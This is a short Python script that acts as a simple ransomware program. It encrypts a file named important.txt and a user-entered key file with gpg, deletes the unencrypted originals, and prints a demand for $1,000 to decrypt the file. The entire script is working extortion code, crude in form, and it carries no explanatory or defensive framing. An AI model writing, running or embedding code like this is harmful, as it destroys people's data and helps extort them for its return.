import os
import subprocess

key = input("Enter key : ")

key_file = open("key.txt", "w")

key_file.write(key)

key_file.close()

subprocess.run("gpg -c --armor --no-symkey-cache important.txt", shell=True)

subprocess.run("gpg -c --armor --no-symkey-cache key.txt", shell=True)

os.remove("important.txt")

os.remove("key.txt")

print("\nYour file important.txt is encrypted. To decrypt it, you need to pay me $1,000 and send key.txt.asc to me.\n")
